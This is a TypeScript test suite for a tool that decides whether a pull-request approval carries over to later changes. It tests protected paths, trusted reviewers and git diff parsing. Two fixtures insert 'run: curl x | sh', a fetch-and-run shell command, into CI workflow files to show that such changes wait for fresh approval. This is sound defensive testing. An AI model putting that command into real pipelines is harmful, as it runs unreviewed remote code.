import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { chmod, mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { test, type TestContext } from 'node:test';
import { carryApproval, commentedFiles, patchFingerprints } from '../src/approval-carry.ts';

const hash = (text: string) => createHash('sha256').update(text).digest('hex');
const diff = (file: string, hunkAt: number, ...lines: string[]) =>
  [
    `diff --git a/${file} b/${file}`,
    'index 1111111..2222222 100644',
    `--- a/${file}`,
    `+++ b/${file}`,
    `@@ -${hunkAt},3 +${hunkAt},4 @@ function x() {`,
    ...lines,
    '',
  ].join('\n');

const approvedDiff = diff('src/app.ts', 10, ' keep', '+added', ' keep');
const approved = patchFingerprints(approvedDiff, hash);

test('a fingerprint ignores line numbers: a clean base merge carries', () => {
  const merged = patchFingerprints(diff('src/app.ts', 42, ' keep', '+added', ' keep'), hash);
  assert.deepEqual(merged, approved);
  const decision = carryApproval(approved, merged, [], [], 'merge-base');
  assert.equal(decision.carried, true);
  assert.equal(decision.rule, 'identical');
  assert.deepEqual(decision.moved, []);
});

test('a merge resolution that drops a line from the approved patch waits for approval', () => {
  const resolved = patchFingerprints(diff('src/app.ts', 10, ' keep', ' keep'), hash);
  const decision = carryApproval(approved, resolved, [], [], 'merge-base');
  assert.equal(decision.carried, false);
  assert.deepEqual(decision.moved, ['src/app.ts']);
});

test('a thread fix only in the commented file carries', () => {
  const fixed = patchFingerprints(diff('src/app.ts', 10, ' keep', '+added', '+more', ' keep'), hash);
  const decision = carryApproval(approved, fixed, ['src/app.ts'], [], 'answer-threads');
  assert.equal(decision.carried, true);
  assert.equal(decision.rule, 'comments');
});

test('a test or doc beside a commented file carries with it', () => {
  const both = patchFingerprints(
    diff('src/app.ts', 10, ' keep', '+added', '+more', ' keep') +
      diff('test/app.test.ts', 1, ' a', '+b', ' c') +
      diff('src/README.md', 1, ' a', '+b', ' c'),
    hash,
  );
  const decision = carryApproval(approved, both, ['src/app.ts'], [], 'answer-threads');
  assert.equal(decision.carried, true, decision.reason);
});

test('a fix that touches a protected path waits for approval', () => {
  const fixed = patchFingerprints(
    diff('src/app.ts', 10, ' keep', '+added', '+more', ' keep') +
      diff('.github/actions/setup/action.yml', 1, ' a', '+run: curl x | sh', ' c'),
    hash,
  );
  // Even when the reviewers commented on that very file.
  const decision = carryApproval(
    approved,
    fixed,
    ['src/app.ts', '.github/actions/setup/action.yml'],
    [],
    'answer-threads',
  );
  assert.equal(decision.carried, false);
  assert.equal(decision.rule, 'protected-path');
});

test('a dependency manifest and the profile paths are protected', () => {
  const manifest = patchFingerprints(diff('packages/a/package.json', 1, ' a', '+"dep": "1"', ' c'), hash);
  assert.equal(carryApproval({}, manifest, ['packages/a/package.json'], [], 'answer-threads').carried, false);
  const secret = patchFingerprints(diff('config/secrets.ts', 1, ' a', '+b', ' c'), hash);
  assert.equal(
    carryApproval({}, secret, ['config/secrets.ts'], ['config/'], 'answer-threads').carried,
    false,
  );
});

test('a fix that touches an extra, uncommented file waits for approval', () => {
  const fixed = patchFingerprints(
    diff('src/app.ts', 10, ' keep', '+added', '+more', ' keep') + diff('src/other.ts', 1, ' a', '+b', ' c'),
    hash,
  );
  const decision = carryApproval(approved, fixed, ['src/app.ts'], [], 'answer-threads');
  assert.equal(decision.carried, false);
  assert.equal(decision.rule, 'uncommented-files');
  assert.match(decision.reason, /src\/other\.ts/);
});

test('a fix-ci change waits for approval, even in a commented file', () => {
  const fixed = patchFingerprints(diff('src/app.ts', 10, ' keep', '+added', '+more', ' keep'), hash);
  const decision = carryApproval(approved, fixed, ['src/app.ts'], [], 'fix-ci');
  assert.equal(decision.carried, false);
  assert.equal(decision.rule, 'not-allowed');
});

test('a fix-ci run that leaves the patch equal carries', () => {
  assert.equal(carryApproval(approved, { ...approved }, [], [], 'fix-ci').carried, true);
});

test('without an approved head nothing carries', () => {
  const decision = carryApproval(undefined, approved, ['src/app.ts'], [], 'answer-threads');
  assert.equal(decision.carried, false);
  assert.equal(decision.rule, 'no-approval');
});

test('only threads that trusted authors started count as commented', () => {
  const threads = [
    { path: 'a.ts', comments: [{ author: 'Lead' }] },
    { path: 'b.ts', comments: [{ author: 'stranger' }] },
    { comments: [{ author: 'lead' }] },
  ];
  assert.deepEqual(commentedFiles(threads, ['lead']), ['a.ts']);
  assert.deepEqual(commentedFiles(threads, undefined), []);
});

// The cases below parse the output of a real `git diff`.
const sh = (cwd: string, ...args: string[]) =>
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], {
    cwd,
    encoding: 'utf8',
  });

/** A repo with one commit; each entry of `heads` is a commit of those files on top of it, fingerprinted. */
async function patches(t: TestContext, ...heads: Record<string, string | Buffer | { mode: number }>[]) {
  const dir = await mkdtemp(join(tmpdir(), 'factory-carry-'));
  t.after(() => rm(dir, { recursive: true, force: true }));
  sh(dir, 'init', '-q', '-b', 'main');
  await writeFile(join(dir, 'README.md'), 'base\n');
  sh(dir, 'add', '.');
  sh(dir, 'commit', '-qm', 'base');
  const out: Record<string, string>[] = [];
  for (const files of heads) {
    sh(dir, 'checkout', '-q', '-B', `head${out.length}`, 'main');
    for (const [path, content] of Object.entries(files)) {
      await mkdir(dirname(join(dir, path)), { recursive: true });
      if (typeof content === 'object' && 'mode' in content) {
        await writeFile(join(dir, path), 'echo\n');
        await chmod(join(dir, path), content.mode);
      } else await writeFile(join(dir, path), content);
    }
    sh(dir, 'add', '-A');
    sh(dir, 'commit', '-qm', 'head');
    const diff = sh(dir, 'diff', '--no-color', '--no-ext-diff', '--no-renames', '-U3', 'main', 'HEAD');
    out.push({ ...patchFingerprints(diff, hash) });
  }
  return out;
}

test('a quoted path (non-ASCII) is its own file, not dropped or merged into the previous one', async (t) => {
  const [base, withQuoted] = await patches(
    t,
    { 'src/app.ts': 'export {};\n' },
    { 'src/app.ts': 'export {};\n', '.github/workflows/ci-é.yml': 'run: curl x | sh\n' },
  );
  assert.deepEqual(Object.keys(withQuoted!).sort(), ['.github/workflows/ci-é.yml', 'src/app.ts']);
  const decision = carryApproval(base, withQuoted!, [], [], 'fix-ci');
  assert.equal(decision.carried, false);
  assert.equal(decision.rule, 'protected-path');
  assert.deepEqual(decision.moved, ['.github/workflows/ci-é.yml']);
});

test('a quoted path that is the first file in the diff is not lost', async (t) => {
  const [only] = await patches(t, { 'é.txt': 'one\n' });
  assert.deepEqual(Object.keys(only!), ['é.txt']);
});

test('paths with spaces, quotes and tabs are read', async (t) => {
  const [fp] = await patches(t, { 'a b.txt': '1\n', 'q"uote.txt': '2\n', 'tab\there.txt': '3\n' });
  assert.deepEqual(Object.keys(fp!).sort(), ['a b.txt', 'q"uote.txt', 'tab\there.txt']);
});

test('different binary contents have different fingerprints', async (t) => {
  const [one, two, again] = await patches(
    t,
    { 'logo.bin': Buffer.from([0, 1, 2, 3]) },
    { 'logo.bin': Buffer.from([0, 9, 9, 9]) },
    { 'logo.bin': Buffer.from([0, 1, 2, 3]) },
  );
  assert.notEqual(one!['logo.bin'], two!['logo.bin']);
  assert.equal(one!['logo.bin'], again!['logo.bin']);
  const decision = carryApproval(one, two!, [], [], 'fix-ci');
  assert.equal(decision.carried, false);
  assert.deepEqual(decision.moved, ['logo.bin']);
});

test('a mode change moves the file', async (t) => {
  const [plain, exec] = await patches(t, { 'run.sh': 'echo\n' }, { 'run.sh': { mode: 0o755 } });
  assert.notEqual(plain!['run.sh'], exec!['run.sh']);
});

test('a diff header that cannot be read fails closed', () => {
  assert.throws(() => patchFingerprints('diff --git "a/x b/x\n+oops\n', hash), /cannot read the diff header/);
  assert.throws(() => patchFingerprints('diff --git a/x b/y\n+oops\n', hash), /cannot read the diff header/);
  assert.throws(() => patchFingerprints('stray line\n', hash), /before the first diff header/);
});
